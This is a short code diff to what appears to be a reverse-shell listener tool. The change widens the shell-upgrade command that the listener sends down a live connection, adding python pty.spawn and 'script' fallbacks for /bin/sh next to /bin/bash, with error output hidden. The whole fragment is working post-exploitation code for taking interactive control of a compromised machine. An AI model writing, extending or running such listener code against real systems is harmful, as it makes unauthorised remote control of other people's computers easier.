@@ -325,7 +325,9 @@ class ShellListener:
                             pty_cmd = (
                                 "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
                                 "|| python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
-                                "|| script -qc /bin/bash /dev/null 2>/dev/null\n"
+                                "|| python3 -c 'import pty; pty.spawn(\"/bin/sh\")' 2>/dev/null "
+                                "|| script -qc /bin/bash /dev/null 2>/dev/null "
+                                "|| script -qc /bin/sh /dev/null 2>/dev/null\n"
                             )
                             conn.sendall(pty_cmd.encode('utf-8'))
                             time.sleep(0.5)
